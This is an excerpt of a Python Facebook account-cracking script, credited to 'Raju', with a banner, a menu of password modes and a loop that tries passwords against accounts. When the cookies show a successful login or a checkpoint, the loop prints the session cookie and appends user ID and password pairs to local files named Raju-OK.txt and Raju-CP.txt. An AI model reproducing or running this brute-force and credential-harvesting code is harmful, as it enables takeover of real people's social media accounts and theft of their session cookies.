...
logo = """
/033[1;37m____        _       
/033[1;37m |  _ \ __ _ (_)_   _ 
/033[1;37m | |_) / _` || | | | |
/033[1;37m |  _ < (_| || | |_| |
/033[1;37m |_| \_\__,_|/ |\__,_|
/033[1;37m          |__/   \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mRaju\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-openhttps://www.facebook.com/profile.php?id=100085218176969 ')
	elif gh =='0':
...
def menu():
	...
	print('[2] Raju+ Op PASS')
	print('[3] Raju + Op PASS')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Raju-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('Raju-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Raju-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Raju-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRaju\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
